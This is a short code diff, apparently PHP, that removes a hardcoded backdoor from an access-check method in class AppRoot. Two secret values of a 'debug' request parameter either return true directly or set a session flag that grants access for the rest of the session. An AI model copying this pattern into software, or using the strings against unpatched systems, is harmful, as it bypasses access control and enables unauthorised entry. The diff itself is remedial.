@@ -548,15 +548,6 @@ class AppRoot
                     return true;
             }
 		}
-        if (\Tools::REQUEST("debug") == "dfYDFSD3F6d7tHSDFGsdhfdSDF")
-            return true;
-
-        if (\Tools::REQUEST("debug") == "jkhdhgsdF8JHhDGF&kJH78DJKS")
-            \Session::getSession()->set("debug", 1);
-
-        if (\Session::getSession()->get("debug"))
-		    return true;
-
 		return false;
 	}
 
